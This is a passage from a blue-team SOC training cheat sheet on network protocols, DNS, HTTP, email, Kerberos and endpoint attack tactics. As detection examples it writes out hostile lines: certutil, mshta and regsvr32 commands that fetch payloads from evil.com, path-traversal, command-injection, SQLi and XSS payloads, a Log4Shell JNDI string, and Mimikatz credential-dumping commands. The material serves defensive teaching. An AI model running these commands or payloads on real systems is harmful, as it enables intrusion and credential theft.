![Wireshark main window: packet list, network layers, packet details, and packet bytes panes](/images/cheatSheets/sec450/book2-p29-traffic-capture-1.jpeg)

*Wireshark main window: packet list, network layers, packet details, and packet bytes panes*

---

#### 2. Zeek (Bro) Network Security Monitor

Zeek transforms raw network packets into rich, structured, tab-separated or JSON log files:

- **Event Engine:** Decodes network protocols in real-time, handling TCP reassembly and state tracking.
- **Policy Scripting:** Programmable scripting language allowing defenders to write custom detection logic on protocol events.
- **Core Blue Team Zeek Logs:**
  - `conn.log:` Every TCP/UDP/ICMP session with timestamps, 5-tuple, duration, bytes sent/received, connection state (`S0`, `SF`, `RSTO`, `REJ`).
  - `dns.log:` Every query, record type, response IP/domain, and return code (`NOERROR`, `NXDOMAIN`, `SERVFAIL`).
  - `http.log:` Method (`GET`, `POST`), URI, Host, User-Agent, status code, response body length, MIME type.
  - `ssl.log:` Server Name Indication (SNI), TLS version, negotiated cipher suite, certificate subject/issuer, validation status.
  - `files.log:` Every file transmitted across HTTP, FTP, SMTP, SMB with wire-calculated SHA-1/MD5 hashes, mime type, and source/dest IPs.
  - `notice.log:` Anomalies and security policy violations flagged by Zeek scripts.

```
# Inspect Zeek conn.log for long-duration outbound connections (potential C2):
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes resp_bytes conn_state | sort -k4 -nr | head -n 20

# Extract top queried DNS domains from dns.log:
cat dns.log | zeek-cut query | sort | uniq -c | sort -nr | head -n 25
```

![Running Zeek against a PCAP produces conn.log, dns.log, http.log, files.log, ssl.log, and other logs](/images/cheatSheets/sec450/book2-p26-traffic-capture-3.png)

*Running Zeek against a PCAP produces conn.log, dns.log, http.log, files.log, ssl.log, and other logs*

![A Zeek http.log record rendered as JSON and queried with jq](/images/cheatSheets/sec450/book2-p27-traffic-capture-1.png)

*A Zeek http.log record rendered as JSON and queried with jq*

---

#### 3. Flow Data Analysis & Anomaly Detection

Flow data provides macroscopic visibility across high-bandwidth backbones:

- **5-Tuple Identification:** Source IP, Destination IP, Source Port, Destination Port, Protocol.
- **Asymmetric Byte Ratios:** Normal web browsing features small client requests (hundreds of bytes) and large server responses (kilobytes/megabytes). A reverse ratio (e.g., massive outbound client bytes with tiny inbound server responses) indicates **data exfiltration**.
- **Beaconing Detection:** Regular flow intervals between an internal host and an external IP with near-identical byte counts reveal automated C2 heartbeat polling.

![Conversation statistics (frames, bytes, relative start, duration) summarized from a packet capture](/images/cheatSheets/sec450/book2-p23-traffic-capture-1.png)

*Conversation statistics (frames, bytes, relative start, duration) summarized from a packet capture*

---

### Module 2.3 — Understanding DNS

#### 1. Domain Name System (DNS) Architecture & Resolution

DNS is the directory service of the Internet, translating human-friendly names into IP addresses:

- **The Resolution Chain:**
  1. **Client / Stub Resolver:** Checks local DNS cache and `hosts` file; queries recursive resolver.
  2. **Recursive Resolver (Local/Enterprise DNS):** Resolves queries on behalf of clients; traverses the hierarchy.
  3. **Root Nameservers (13 root server clusters, A–M):** Directs resolver to the Authoritative TLD servers.
  4. **TLD Nameservers:** Manages top-level domains (`.com`, `.org`, `.gov`, country codes); directs to authoritative nameserver.
  5. **Authoritative Nameserver:** Holds the definitive DNS zone records for the target domain.

![Two nslookup queries for google.com returning different IP addresses](/images/cheatSheets/sec450/book2-p43-understanding-dns-1.png)

*Two nslookup queries for google.com returning different IP addresses*

---

#### 2. Essential DNS Resource Records for Blue Teams

Defenders must understand the structural role of every DNS record type:

| Record Type | Name | Purpose | Blue Team Operational Significance |
|-------------|------|---------|------------------------------------|
| **A** | Address (IPv4) | Maps domain name to 32-bit IPv4 address. | Primary destination IP for threat intelligence and reputation checks. |
| **AAAA** | Address (IPv6) | Maps domain name to 128-bit IPv6 address. | Can bypass IPv4-only firewall rules or monitoring sensors. |
| **CNAME** | Canonical Name | Alias pointing one domain name to another domain name. | Often used by CDNs, cloud infrastructure, and C2 redirectors. |
| **MX** | Mail Exchange | Specifies mail servers responsible for accepting email for the domain. | Priority values dictate routing; invalid MX records indicate malicious sender domains. |
| **TXT** | Text Record | Arbitrary text strings; holds verification data. | Carries **SPF, DKIM, and DMARC** policies; heavily abused for **DNS Tunneling C2**. |
| **PTR** | Pointer Record | Reverse lookup; maps IP address back to domain name. | Critical for identifying internal hostnames from raw IP logs. |
| **NS** | Name Server | Delegates a DNS zone to use specific authoritative nameservers. | Reveals domain ownership infrastructure; bulletproof hosters use distinct NS clusters. |
| **SOA** | Start of Authority | Zone metadata: primary master NS, admin email, serial number, refresh/retry timers. | Tracking serial number modifications reveals zone transfer activity and domain ownership turnover. |

![Forward lookup of google.com followed by a PTR (reverse) lookup of the returned IP](/images/cheatSheets/sec450/book2-p44-understanding-dns-1.png)

*Forward lookup of google.com followed by a PTR (reverse) lookup of the returned IP*

---

#### 3. Time-to-Live (TTL) & Caching Dynamics

TTL governs how long resolvers and clients cache DNS responses before re-querying:

- **Standard Enterprise TTL:** Typically hours to days (e.g., 3600s–86400s) for operational stability.
- **Attacker Fast-Flux TTL:** Set to extremely short durations (e.g., **0 to 300 seconds**). This forces victims to constantly resolve new IPs, cycling through compromised botnet proxies to evade IP-based blocking.

---

### Module 2.4 — DNS Attacks and Analysis

#### 1. Sensor Placement Impact on DNS Telemetry

Where you tap DNS traffic fundamentally alters your analytical visibility:

- **Inside Sensor (Client to Internal Resolver):**
  - **Source IP:** The actual compromised client workstation (`10.1.5.42`).
  - **Destination IP:** The internal enterprise DNS server (`10.1.1.5`).
  - **Value:** Directly reveals *patient zero* without cross-referencing internal server query logs.
- **Outside Sensor (Internal Resolver to Internet Root/Authoritative):**
  - **Source IP:** The internal DNS server (`10.1.1.5`).
  - **Destination IP:** External public authoritative nameservers.
  - **Value:** Captures all external queries that missed local cache, but obscures the identity of the specific internal host that requested the record.
- **SOC Best Practice:** Tap **both** positions, or configure internal DNS servers to forward full query logs (`Microsoft-Windows-DNSServer/Analytical` or BIND query logging) into the SIEM.

---

#### 2. DNS Tunneling and Data Exfiltration

Adversaries abuse DNS queries to bypass network firewalls that permit outbound port 53:

- **Operational Mechanism:** The attacker controls an authoritative nameserver for `evil.com`. Compromised malware encodes stolen data or C2 commands into the subdomain label of a lookup:
  ```
  Query:  [Base64/Hex-Encoded-Stolen-Data].evil.com
  Result: Resolver forwards query to attacker's authoritative server; server decodes stolen data!
  C2:     Attacker responds with TXT record containing Base64 encoded commands!
  ```
- **Detection Indicators for DNS Tunneling:**
  - **Unusually Long Query Length:** Normal domain queries average 15–25 characters. Tunneling queries frequently exceed **60 to 200+ characters**.
  - **High Character Entropy:** Random alphanumeric strings (Base64/Hex/Base32) produce high Shannon entropy (> 3.8) compared to natural language domain names.
  - **Excessive TXT / NULL Record Queries:** Normal enterprise traffic is 90%+ A/AAAA records. A sudden spike in TXT queries indicates C2 communication.
  - **Massive Subdomain Volume:** Thousands of unique subdomains queried for a single apex domain (`*.c2tunnel.net`).
  - **High Query Frequency / Volume:** Thousands of queries per hour originating from a single internal endpoint.
- **Common Tunneling Tools:** Iodine, dnscat2, Cobalt Strike DNS Beacon.

![DNS TXT answer for a long encoded hostname, with encoded data carried in the TXT string](/images/cheatSheets/sec450/book2-p72-dns-attacks-2.png)

*DNS TXT answer for a long encoded hostname, with encoded data carried in the TXT string*

---

#### 3. Domain Generation Algorithms (DGA) & Fast-Flux

Adversaries build resilient C2 infrastructure that evades static blocklists:

- **Domain Generation Algorithms (DGA):**
  - Malware generates hundreds or thousands of pseudorandom domains daily using a shared seed (e.g., current date, financial index).
  - The attacker registers only 1 or 2 of these generated domains; the malware queries them sequentially until finding the active C2.
  - **Detection:** High volume of **NXDOMAIN (Non-Existent Domain)** response errors in `dns.log` originating from a single host within a narrow time window.
- **Fast-Flux Networks:**
  - **Single-Flux:** Rapidly cycling the A record IP addresses (low TTLs, 60s) pointing to compromised residential bots acting as reverse proxies.
  - **Double-Flux:** Rapidly cycling **both** the A records and the authoritative **NS records**, making takedown nearly impossible.

![Domains first seen by date: familiar Google infrastructure names (green) versus unusual, random-looking domains (red)](/images/cheatSheets/sec450/book2-p43-understanding-dns-2.png)

*Domains first seen by date: familiar Google infrastructure names (green) versus unusual, random-looking domains (red)*

![Top-level domains ranked by percentage of sites classed as shady](/images/cheatSheets/sec450/book2-p59-dns-attacks-1.jpeg)

*Top-level domains ranked by percentage of sites classed as shady*

![Free domain registrations available under .tk, .ml, .ga, .cf, and .gq](/images/cheatSheets/sec450/book2-p59-dns-attacks-2.png)

*Free domain registrations available under .tk, .ml, .ga, .cf, and .gq*

---

#### 4. Internationalized Domain Names (IDN) & Homoglyph Attacks

Attackers spoof trusted brand names using Unicode lookalikes:

- **Homoglyph Concept:** Cyrillic small letter "а" (U+0430) looks identical to Latin letter "a" (U+0061), but resolves to an entirely different IP address.
- **Punycode Representation:** Browsers translate international Unicode domains into ASCII-compatible encoding prefixed with `xn--`:
  - `gооgle.com` (with Cyrillic 'о') -> `xn--ggle-p50aa.com`
- **Blue Team Rule:** Alert on any enterprise DNS queries or web proxy requests containing the `xn--` prefix for brand-sensitive domains.

![Email containing a link that renders as 'SEC450.com' but uses a look-alike character](/images/cheatSheets/sec450/book2-p80-dns-attacks-2.jpeg)

*Email containing a link that renders as 'SEC450.com' but uses a look-alike character*

![The same look-alike link as it renders in a mail client](/images/cheatSheets/sec450/book2-p80-dns-attacks-7.jpeg)

*The same look-alike link as it renders in a mail client*

---

#### 5. DNS over HTTPS (DoH) & Passive DNS (pDNS)

Emerging protocols create both blind spots and investigative opportunities:

- **DNS over HTTPS (DoH) / DNS over TLS (DoT):**
  - **Blue Team Impact:** Encrypts DNS queries inside standard HTTPS (TCP 443) to public resolvers (Cloudflare `1.1.1.1`, Google `8.8.8.8`). Bypasses internal DNS monitoring and protective DNS blocking!
  - **Enterprise Countermeasure:** Enforce enterprise group policy to disable browser DoH; block outbound connections to known public DoH resolver IPs at the perimeter firewall.
- **Passive DNS (pDNS):**
  - Sensors capture and store historical DNS resolution data across global networks.
  - **Forensic Value:** Allows analysts to ask: *"What IP addresses did this domain resolve to 6 months ago?"* and *"What other domains have ever resolved to this malicious IP address?"*

![DNS over HTTPS exchange: POST /dns-query to cloudflare-dns.com with the decoded query and response](/images/cheatSheets/sec450/book2-p86-exercise-dns-2.jpeg)

*DNS over HTTPS exchange: POST /dns-query to cloudflare-dns.com with the decoded query and response*

![Investigation flow for a domain or IP: DNS logs, proxy/EDR/Sysmon data, then passive DNS sources](/images/cheatSheets/sec450/book2-p56-dns-attacks-1.png)

*Investigation flow for a domain or IP: DNS logs, proxy/EDR/Sysmon data, then passive DNS sources*

---

### Module 2.5 — Understanding HTTP and TLS/HTTPS

#### 1. HTTP Protocol Mechanics

HTTP is an application-layer, stateless request-response protocol underpinning web operations:

- **HTTP Request Line:** Method + Request-URI + Protocol Version (e.g., `GET /index.html HTTP/1.1`).
- **Core HTTP Methods:**
  - `GET:` Retrieve data from a server; parameters passed in URI query string (`?id=123`).
  - `POST:` Send data to the server in the request message body (forms, file uploads, credentials, JSON API payloads).
  - `HEAD:` Identical to GET but asks server to return headers only without the message body; used for quick availability checks.
  - `PUT / DELETE:` Upload or remove a specific resource on the web server; dangerous if enabled without strict authentication.
  - `OPTIONS:` Queries the web server for supported communication options and allowed HTTP methods.
  - `CONNECT:` Establishes an HTTP tunnel through an explicit proxy, typically to tunnel encrypted TLS/SSL sessions.

![HTTP request captured in Wireshark: GET /success.txt with Host, User-Agent, and Accept headers](/images/cheatSheets/sec450/book2-p93-understanding-http-1.png)

*HTTP request captured in Wireshark: GET /success.txt with Host, User-Agent, and Accept headers*

![HTTP response headers: status line, Server, Date, Content-Type, Content-Length, Via, and Age](/images/cheatSheets/sec450/book2-p102-understanding-http-1.png)

*HTTP response headers: status line, Server, Date, Content-Type, Content-Length, Via, and Age*

---

#### 2. HTTP Response Status Codes for Triage

Status codes provide instant operational insight into server-side execution results:

| Status Range | Category | Key Codes & Operational Meaning |
|--------------|----------|---------------------------------|
| **1xx** | Informational | `101 Switching Protocols` (e.g., upgrading HTTP connection to WebSocket). |
| **2xx** | Success | `200 OK` (Request succeeded, payload returned); `204 No Content` (Succeeded, no body returned). |
| **3xx** | Redirection | `301 Moved Permanently`; `302 Found` (Temporary redirect). Phishing links frequently chain multiple 302 redirects to evade automated scanners. |
| **4xx** | Client Error | `400 Bad Request`; `401 Unauthorized`; `403 Forbidden` (WAF blocked request or access denied); `404 Not Found` (Reconnaissance scan hit nonexistent path). |
| **5xx** | Server Error | `500 Internal Server Error` (Exploit attempt crashed backend script or triggered unhandled SQL/PHP exception); `502 Bad Gateway`; `503 Service Unavailable`. |

---

#### 3. Critical HTTP Headers for Blue Team Analysis

HTTP headers contain vital forensic breadcrumbs:

- **`Host:`** Mandatory in HTTP/1.1. The domain name requested by the client. Essential for identifying virtual hosts sharing a single IP address.
- **`User-Agent:`** Identifies the browser, operating system, and client software. Attackers frequently use default script headers (`python-requests/2.28`, `curl/7.88`, `Go-http-client/1.1`) or slightly misspelled legitimate strings.
- **`Referer:`** The URL of the previous web page from which the current link was followed. Essential for tracing drive-by download chains and phishing redirects.
- **`X-Forwarded-For (XFF):`** De-facto standard header added by proxies and load balancers indicating the true originating client IP address (`X-Forwarded-For: client, proxy1, proxy2`).
- **`Authorization:`** Carries client authentication credentials (e.g., `Basic [Base64-string]` or `Bearer [JWT-token]`).

![Anatomy of a Firefox 97.0 User-Agent string broken into its components](/images/cheatSheets/sec450/book2-p117-http-attacks-1.png)

*Anatomy of a Firefox 97.0 User-Agent string broken into its components*

---

#### 4. TLS Handshake, SNI, and JA3 Fingerprinting

As 95%+ of web traffic is encrypted, defenders rely on metadata exposed during the TLS handshake:

```
[Client]                                                [Server]
   |  ---- 1. Client Hello (SNI, Cipher Suites) ---->      |
   |  <--- 2. Server Hello (Chosen Cipher) -----------     |
   |  <--- 3. Certificate & Key Exchange -------------     |
   |  ---- 4. Client Key Exchange & Finished -------->     |
   |  <--- 5. Encrypted Application Data ------------>     |
```

- **Server Name Indication (SNI):** TLS extension sent in the clear inside the `Client Hello` packet specifying the hostname the client is connecting to. Allows defenders to see the target domain even without decrypting TLS!
- **JA3 Client Fingerprinting:**
  - Concatenates 5 client handshake parameters: `SSLVersion,CipherSuites,Extensions,EllipticCurves,EllipticCurvePointFormats`.
  - Produces an MD5 hash uniquely identifying the client application or malware family (e.g., standard Cobalt Strike, Emotet, or PowerShell clients share fixed JA3 hashes regardless of IP or domain).
- **JA3S Server Fingerprinting:** Fingerprints the server's negotiated response, combining `SSLVersion,Cipher,Extensions`.

![TLS handshake in Wireshark: Client Hello, Server Hello, and the server certificate](/images/cheatSheets/sec450/book2-p135-http-attacks-1.png)

*TLS handshake in Wireshark: Client Hello, Server Hello, and the server certificate*

![Certificate details for www.google.com: issuer, validity dates, and subject](/images/cheatSheets/sec450/book2-p135-http-attacks-2.png)

*Certificate details for www.google.com: issuer, validity dates, and subject*

---

### Module 2.6 — HTTP(S) Attacks and Analysis

#### 1. Web-Based Attack Signatures in Web Logs

Web server access logs (`access.log`, W3C, IIS) reveal exploitation attempts:

- **Directory Traversal / Path Traversal:**
  - Patterns: `../../../../etc/passwd` or `..%2f..%2f..%2fwindows%2fsystem32%2fcmd.exe`
  - Indicators: Encoded slashes (`%2e%2e%2f`), null byte injection (`%00`).
- **Command Injection:**
  - Patterns: Semicolons, pipes, and shell operators concatenated to input parameters:
    `?ip=127.0.0.1;cat /etc/shadow` or `?param=test|whoami`
- **SQL Injection (SQLi):**
  - Error-based / Boolean patterns: `' OR 1=1--`, `' UNION SELECT null, username, password FROM users--`
  - Time-based blind patterns: `WAITFOR DELAY '0:0:10'`, `pg_sleep(10)`
- **Cross-Site Scripting (XSS):**
  - Reflected / Stored patterns: `<script>alert(document.cookie)</script>`, `<img src=x onerror=alert(1)>`

---

#### 2. Web Shell Identification & Post-Exploitation Triage

A web shell is a backdoor script uploaded to a public web directory allowing persistent remote command execution:

- **Common Extensions:** `.php`, `.jsp`, `.aspx`, `.asp`, `.pl`, `.war`
- **Triage Indicators in Web Logs:**
  - **Single Access / Rare URI:** A newly created file accessed only by a single external IP address.
  - **100% POST Requests:** Web shells typically receive commands via HTTP `POST` requests to hide parameters from server access logs.
  - **Static Size Response Anomaly:** Repetitive response byte sizes or extreme variations matching shell command output.
  - **Common Parameter Names:** `?cmd=`, `?c=`, `?exec=`, `?x=`, `?pass=`.
- **Blue Team Forensic Action:** Inspect file creation timestamps on the web server; check web server parent process spawning shells (`w3wp.exe` spawning `cmd.exe` or `powershell.exe`; `httpd` / `apache2` spawning `/bin/bash` or `/bin/sh`).

---

#### 3. C2 Beaconing Analytics via Web Proxy Logs

Adversaries tunneling C2 over HTTP/HTTPS generate measurable statistical anomalies:

- **Interval Regularity:** Malware scheduled to poll every 60 seconds produces a tight distribution curve in connection timestamps.
- **Jitter Calculations:** Sophisticated malware adds pseudorandom jitter (e.g., ±20%) to avoid fixed interval detection:
  - Detection requires calculating the coefficient of variation ($CV = \sigma / \mu$) across connection intervals.
- **User-Agent Anomalies:**
  - Bare or minimal strings: `Mozilla/5.0` (missing OS and browser version components).
  - Outdated browser strings: An alert analyst questions why an employee workstation is browsing with Internet Explorer 7.0 in 2026.
  - Non-browser software agents: `certutil`, `bitsadmin`, `python`, `powershell`, `winhttp`.

---

#### 4. Course Examples: Exploit Kit, Malware Download, and Phishing Kit Traffic

Captured traffic from the course shows how the signatures above appear in practice:

- **Log4Shell exploitation attempt:** JNDI lookup strings (`${jndi:ldap://...}`) placed in the URI, `User-Agent`, and `Referer` fields.

![HTTP request carrying JNDI lookup strings in the URI, User-Agent, and Referer](/images/cheatSheets/sec450/book2-p129-http-attacks-1.png)

*HTTP request carrying JNDI lookup strings in the URI, User-Agent, and Referer*

- **Exploit kit traffic:** A run of requests to unrelated hostnames that ends with a request for an executable.

![HTTP request list annotated as RIG exploit kit traffic, ending in a request for an executable](/images/cheatSheets/sec450/book2-p127-http-attacks-1.png)

*HTTP request list annotated as RIG exploit kit traffic, ending in a request for an executable*

- **Malware download over HTTP:** An `application/octet-stream` response whose body begins with the `MZ` magic bytes and the DOS stub message. Compare the declared content type with the real file signature.

![Follow TCP Stream view of GET /da.exe returning application/octet-stream with an MZ header](/images/cheatSheets/sec450/book2-p123-http-attacks-2.png)

*Follow TCP Stream view of GET /da.exe returning application/octet-stream with an MZ header*

- **Phishing kit:** A credential-harvesting page imitating a trusted brand and served from an unrelated domain.

![Fake Office 365 sign-in page served from an unrelated .tk domain](/images/cheatSheets/sec450/book2-p113-http-attacks-1.jpeg)

*Fake Office 365 sign-in page served from an unrelated .tk domain*

---

### Module 2.7 — Understanding SMTP and Email Security

#### 1. Simple Mail Transfer Protocol (SMTP) Flow

SMTP is a plain-text, store-and-forward protocol operating on TCP port 25 (relays) and 587 (client submission):

```
[Sending Mail Server]                                   [Receiving Mail Server]
         |  <--- 220 mail.receiver.com ESMTP ready -----           |
         |  ---- HELO/EHLO mail.sender.com ------------>           |
         |  <--- 250 Hello mail.sender.com -------------           |
         |  ---- MAIL FROM: <attacker@spoofed.com> ---->           |
         |  <--- 250 OK --------------------------------           |
         |  ---- RCPT TO: <victim@target.com> ---------->           |
         |  <--- 250 OK --------------------------------           |
         |  ---- DATA --------------------------------->           |
         |  <--- 354 Start mail input; end with <CRLF>.<CRLF>      |
         |  ---- [RFC 5322 Headers + Email Body] ------>           |
         |  ---- . ------------------------------------>           |
         |  <--- 250 OK: message queued ----------------           |
         |  ---- QUIT --------------------------------->           |
         |  <--- 221 Bye -------------------------------           |
```

![SMTP session over telnet: EHLO, MAIL FROM, RCPT TO, DATA, and QUIT](/images/cheatSheets/sec450/book2-p145-smtp-email-1.jpeg)

*SMTP session over telnet: EHLO, MAIL FROM, RCPT TO, DATA, and QUIT*

---

#### 2. Reading Email Headers for Phishing Investigations

Email headers contain the definitive audit trail of an email's transit across the Internet:

- **`Received:` Headers (Golden Rule: Read from BOTTOM to TOP):**
  - Every MTA (Mail Transfer Agent) that handles the message prepends a new `Received:` header to the top of the email.
  - The **bottom-most** `Received:` header represents the original injection point where the sender's client transmitted the email to the first mail server.
  - Top headers can be spoofed by the attacker; the header added by *your* enterprise mail gateway is guaranteed to be authentic.
- **Envelope From vs Header From:**
  - **Envelope From (`MAIL FROM / Return-Path`):** Used by servers to return bounce-back NDRs.
  - **Header From (`From:`):** Displayed to the end user in Outlook or Gmail. Attackers frequently spoof the `From:` header while using a completely different `Return-Path`.
- **`Message-ID:`** Unique identifier generated by the sending mail system.
- **`X-Originating-IP:`** Header inserted by webmail providers (Hotmail/Yahoo) exposing the true residential/WAN IP of the user sending the email.

![Viewing the full message headers using 'Show original' in a webmail client](/images/cheatSheets/sec450/book2-p148-smtp-email-1.png)

*Viewing the full message headers using 'Show original' in a webmail client*

![Received headers numbered in the order the message traversed each server (read from the bottom up)](/images/cheatSheets/sec450/book2-p149-smtp-email-1.png)

*Received headers numbered in the order the message traversed each server (read from the bottom up)*

---

#### 3. Email Authentication Triad: SPF, DKIM, and DMARC

Modern email security relies on cryptographic and DNS-based verification standards:

| Mechanism | Full Name | How It Works | DNS Record Syntax | Failure Action |
|-----------|-----------|--------------|-------------------|----------------|
| **SPF** | Sender Policy Framework | Domain owner publishes authorized IP addresses permitted to send mail for the domain. | `v=spf1 ip4:198.51.100.0/24 include:_spf.google.com ~all` | `-all` (Hard Fail / Reject); `~all` (Soft Fail / Tag). |
| **DKIM** | DomainKeys Identified Mail | Sending MTA cryptographically signs the email header and body using a private key; public key published in DNS TXT record. | `selector._domainkey.domain.com TXT "v=DKIM1; k=rsa; p=MIGf..."` | Receiver verifies signature against public key; prevents message tampering in transit. |
| **DMARC** | Domain-based Message Authentication, Reporting & Conformance | Ties SPF and DKIM together; enforces domain alignment and tells receiver how to handle failures. | `_dmarc.domain.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc-reports@domain.com"` | `p=none` (Monitor only); `p=quarantine` (Send to Junk/Spam); `p=reject` (Drop completely). |

---

#### 4. Phishing Vector Classifications & Triage

Phishing remains the number one initial access vector (MITRE ATT&CK T1566):

- **Display Name Spoofing:** Attacker sets display name to *"CEO John Smith"*, but the underlying email is `johnsmith99812@gmail.com`.
- **Lookalike / Cousin Domains:** Registering typosquatted domains (`micros0ft.com`, `bank-secure-login.net`).
- **Weaponized Attachments:**
  - Malicious Office macros (`.docm`, `.xlsm`)
  - Container files (`.iso`, `.vhd`, `.img`, `.zip`) designed to bypass Mark of the Web (MOTW) and perimeter scanners
  - Windows Shortcut files (`.lnk`) executing embedded PowerShell scripts
  - HTML Smuggling: Base64-encoded payloads reconstructed locally in the victim's browser using JavaScript Blob objects.

---

### Module 2.8 — Additional Network Protocols for Blue Teams

#### 1. Server Message Block (SMB) & Remote Procedure Call (RPC)

SMB (TCP 445) and NetBIOS (TCP 139) are ubiquitous in Windows enterprise environments and heavily abused for lateral movement:

- **Core SMB Operations:** File sharing, remote printer management, and named pipe communication.
- **Named Pipes:** Inter-process communication mechanism operating over SMB:
  - `\pipetsvc:` Task scheduler
  - `\pipe\samr:` Security Account Manager remote access
  - `\pipe\svcctl:` Service control manager (used by `PsExec` to install and start remote services)
- **Notable Exploits & Tools:** EternalBlue (MS17-010 / WannaCry), PsExec, Impacket `smbexec` / `wmiexec`.
- **Blue Team Detection:** High volume of SMB session setups from non-admin workstations to peer workstations; administrative share access (`C$`, `ADMIN$`, `IPC$`).

---

#### 2. Kerberos Authentication Architecture

Kerberos (TCP/UDP 88) is the default Active Directory authentication protocol:

- **Core Components:** Key Distribution Center (KDC), Authentication Service (AS), Ticket Granting Service (TGS).
- **Authentication Flow:**
  1. **AS-REQ / AS-REP:** Client requests Ticket Granting Ticket (TGT); proves identity using password hash.
  2. **TGS-REQ / TGS-REP:** Client presents TGT to request a Service Ticket (ST) for a specific Service Principal Name (SPN).
  3. **AP-REQ / AP-REP:** Client presents Service Ticket to the target application server.
- **Adversary Attacks against Kerberos:**
  - **Kerberoasting:** Requesting Service Tickets for accounts with SPNs, extracting the ticket from memory, and cracking the RC4/AES service account password offline.
  - **AS-REP Roasting:** Querying users who have *"Do not require Kerberos preauthentication"* enabled; KDC returns password hash in AS-REP without prior validation.
  - **Golden Ticket:** Forged TGT created using the stolen Active Directory `KRBTGT` account hash. Grants unrestricted access to any resource in the domain for years.
  - **Silver Ticket:** Forged Service Ticket created using a specific computer/service account hash.

---

#### 3. Dynamic Host Configuration Protocol (DHCP) & ICMP

Supporting network protocols that provide critical investigative context:

- **DHCP (UDP 67/68):**
  - **DORA Process:** Discover, Offer, Request, Acknowledge.
  - **Forensic Value:** Essential for resolving ephemeral internal IP addresses back to specific hardware MAC addresses and computer hostnames at an exact timestamp.
- **ICMP (Internet Control Message Protocol):**
  - **Type 8 / Type 0:** Echo Request / Echo Reply (Ping). Used by attackers for network discovery sweeps.
  - **ICMP Tunneling:** Encoding arbitrary data inside the optional payload field of Echo Request/Reply packets to bypass strict firewalls (tools: `ptunnel`, `icmptunnel`).

![ICMP echo request in Wireshark carrying readable text in its data payload](/images/cheatSheets/sec450/book2-p176-additional-protocols-1.jpeg)

*ICMP echo request in Wireshark carrying readable text in its data payload*

---

## Book 3 — Understanding Endpoints, Logs, and Files

> **SEC 450.3 — Understanding Endpoints, Logs, and Files**

### Module 3.1 — Endpoint Attack Tactics

#### 1. The Post-Exploitation Endpoint Lifecycle

Once an adversary achieves initial code execution, they follow a predictable behavioral progression mapped by MITRE ATT&CK:

1. **Initial Execution:** Running malicious code via macro, script, or compiled payload (T1059).
2. **Defense Evasion:** Bypassing AMSI, disabling logging, masquerading process names, injecting into benign processes (T1055).
3. **Discovery:** Gathering internal situational awareness (`whoami /all`, `net user`, `net group "Domain Admins" /domain`, `ipconfig /all`) (T1087, T1082).
4. **Privilege Escalation:** Exploiting local kernel vulnerabilities, unquoted service paths, or weak ACLs to escalate to `NT AUTHORITY\SYSTEM` (T1068, T1574).
5. **Credential Access:** Dumping credentials from LSASS memory, SAM database, or cached credentials (T1003).
6. **Lateral Movement:** Pivoting across the internal network to compromise adjacent machines using stolen credentials (T1021, T1550).
7. **Persistence:** Securing reboot-survivable footholds via registry run keys, scheduled tasks, or malicious services (T1547, T1053).

---

#### 2. Mimikatz — The Gold Standard Credential Extraction Toolkit

Created by Benjamin Delpy, Mimikatz is the most impactful Windows credential dumping tool:

- **Core Capabilities:**
  - `sekurlsa::logonpasswords:` Injects into `lsass.exe` process memory to extract plaintext passwords, NTLM password hashes, and Kerberos tickets stored in memory by WDigest, Kerberos, and TSPkg providers.
  - `lsadump::sam:` Dumps local SAM database password hashes (local administrator accounts).
  - `lsadump::dcsync:` Simulates a Domain Controller using the Directory Replication Service Remote Protocol (`MS-DRSR`) to request domain password hashes directly from the genuine DC without running code on the DC itself!
  - `kerberos::golden:` Forges Kerberos Ticket Granting Tickets (TGTs) using the stolen Active Directory `KRBTGT` account hash.
- **Defensive Mitigations:**
  - Enable **LSA Protection (RunAsPPL)**: Enforces LSASS to run as a Protected Process Light, blocking non-protected code from opening handles to LSASS memory.
  - Enable **Credential Guard**: Isolates LSA secrets inside a hardware-isolated, virtualization-based security (VBS) hypervisor container.
  - Set `WDigest\UseLogonCredential` registry key to `0` to prevent caching plaintext credentials in memory.

![Mimikatz loaded through a PowerShell download cradle and dumping logon passwords, NTLM hashes, and a cleartext password](/images/cheatSheets/sec450/book3-p22-endpoint-attack-tactics-1.png)

*Mimikatz loaded through a PowerShell download cradle and dumping logon passwords, NTLM hashes, and a cleartext password*

![LSASS in the high-level operating system versus LSAIso under virtualization-based security](/images/cheatSheets/sec450/book3-p37-endpoint-defense-1.png)

*LSASS in the high-level operating system versus LSAIso under virtualization-based security*

---

#### 3. The Privilege Escalation Staircase

Attackers methodically elevate authority within a Windows domain hierarchy:

```
[Standard User]  -->  [Local Administrator]  -->  [NT AUTHORITY\SYSTEM]  -->  [Domain Administrator]  -->  [Enterprise Admin]
(Initial Phish)       (Bypass UAC / Exploit)     (Inject into LSASS)          (DCSync / Golden Ticket)      (Full Forest Control)
```

- **UAC Bypass:** Windows User Account Control (UAC) is a convenience boundary, not a cryptographic security boundary. Attackers abuse auto-elevating Windows binaries (`fodhelper.exe`, `eventvwr.exe`) to spawn elevated shells without prompting the user.
- **Service Misconfigurations:** Unquoted service paths (`C:\Program Files\Vendor App\service.exe`) allow unprivileged users to place a malicious `C:\Program.exe` which executes with SYSTEM privileges when the computer boots.

---

#### 4. Living Off the Land Binaries (LOLBins) & LOLScripts

Adversaries weaponize legitimate, Microsoft-signed system utilities to bypass application control and antivirus:

| LOLBin | Legitimate Purpose | Adversary Weaponization Technique | Detection Indicator |
|--------|--------------------|-----------------------------------|---------------------|
| **`powershell.exe`** | System Administration | Script execution, in-memory payload delivery, AMSI bypass, C2 beacons. | `-EncodedCommand`, `-NoProfile -NonInteractive -ExecutionPolicy Bypass`, downloading from external IPs via `Net.WebClient`. |
| **`certutil.exe`** | Certificate Management | Downloading remote files and decoding Base64 payloads. | `certutil.exe -urlcache -split -f http://evil.com/payload.exe` or `certutil.exe -decode payload.txt payload.exe`. |
| **`bitsadmin.exe`** | Background File Transfer | Stealthy asynchronous file downloading surviving user logouts. | `bitsadmin /transfer myDownloadJob /download /priority normal http://... C:\path`. |
| **`mshta.exe`** | HTML Applications | Executing malicious inline VBScript or JScript directly from a URL. | `mshta.exe http://evil.com/payload.hta` or executing inline JavaScript. |
| **`rundll32.exe`** | DLL Execution | Running exported functions within arbitrary DLLs. | Spawning command shells or executing malicious DLLs without standard file extensions. |
| **`regsvr32.exe`** | COM Registration | "Squiblydoo" attack: Bypasses AppLocker to execute remote scriptlets. | `regsvr32.exe /s /u /i:http://evil.com/scriptlet.sct scrobj.dll`. |
